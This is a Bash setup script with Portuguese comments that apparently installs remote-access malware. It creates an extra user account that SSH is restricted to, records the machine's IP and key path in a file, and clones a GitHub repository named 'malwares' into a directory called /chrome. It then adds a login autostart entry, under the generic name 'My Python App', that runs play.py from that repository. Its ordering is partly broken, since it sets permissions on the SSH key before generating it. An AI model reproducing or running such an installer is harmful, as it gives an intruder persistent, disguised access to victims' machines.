#!/bin/bash

# Verifica se o script está sendo executado como root
if [[ $EUID -ne 0 ]]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

# Antes de iniciar este comando: chmod +x start.sh
# Instalação do Python e dependências
apt update
apt install -y git
apt install -y python3 python3-pip python3-venv git
apt install -y openssh-server

# Configurações
venv_name="chrome"
venv_dir="./chrome/venv"
python_executable="python3"
username=$(whoami)
usernameb="play"
repository_url="https://github.com/efraim-lima/malwares"
relative_path="./modules/play.py"
install_directory="/chrome"
ssh_port="22" # Porta SSH (padrão é 22)
ssh_dir="/home/$username/.ssh"
ssh_key="$ssh_dir/id_rsa"
output_file="ssh_info.txt"
app_name="My Python App"

# Criação de um novo usuário
useradd -m -s /bin/bash $usernameb
passwd $usernameb

# Define as permissões corretas para a chave
chown -R $username:$username $ssh_dir
chmod 700 $ssh_dir
chmod 600 $ssh_key*

# Configuração do acesso remoto via SSH
sed -i "s/#Port 22/Port $ssh_port/" /etc/ssh/sshd_config
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
echo "AllowUsers $usernameb" >> /etc/ssh/sshd_config

# Reinicia o serviço SSH
systemctl restart ssh

# Exporta informações para o arquivo de saída
output_path="/home/$username/$output_file"
echo "Chave SSH: $ssh_key" > $output_path
echo "Nome de usuário: $usernameb" >> $output_path
echo "IP da máquina: $(hostname -I)" >> $output_path

echo "Chave SSH criada com sucesso. As informações foram exportadas para o arquivo $output_file."
echo "Agora você pode acessar sua máquina remotamente via terminal usando:"
echo "ssh -p $ssh_port $usernameb@$(hostname -I)"

# Criação da chave SSH
mkdir -p $ssh_dir
ssh-keygen -t rsa -b 4096 -f $ssh_key -N ""

# Clone o repositório com permissões do usuário atual
if [ ! -d "$install_directory" ]; then
    git clone "$repository_url" "$install_directory"
else
    echo "O diretório de instalação $install_directory já existe."
fi

# Criação do ambiente virtual
if [ ! -d "$venv_dir" ]; then
    $python_executable -m venv "$venv_dir/$venv_name"
else
    echo "O diretório de ambiente virtual $venv_dir já existe."
fi

# Função para ativar o ambiente virtual e iniciar as aplicações
activate_venv_and_start_app() {
    # Ativação do ambiente virtual
    source "$venv_dir/$venv_name/bin/activate"

    # Instalação das dependências do requirements.txt (opcional)
    if [ -f "$install_directory/requirements.txt" ]; then
        pip install -r "$install_directory/requirements.txt"
    else
        echo "O arquivo requirements.txt não foi encontrado."
    fi

    # Execução dos comandos adicionais dentro do ambiente virtual
    # ... (adicione seus comandos aqui)
}

# Executa a função de ativação do ambiente virtual e início das aplicações
activate_venv_and_start_app

# Criação do arquivo .desktop para iniciar com o sistema
desktop_file="/home/$username/.config/autostart/$app_name.desktop"
tee "$desktop_file" > /dev/null <<EOT
[Desktop Entry]
Type=Application
Exec=$venv_dir/$venv_name/bin/python $relative_path
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=$app_name
Name=$app_name
Comment[en_US]=My Python Application
Comment=My Python Application
EOT

# Define as permissões corretas para o arquivo .desktop
chown $username:$username $desktop_file
chmod +x $desktop_file

echo "A aplicação $app_name foi configurada para iniciar automaticamente com o sistema."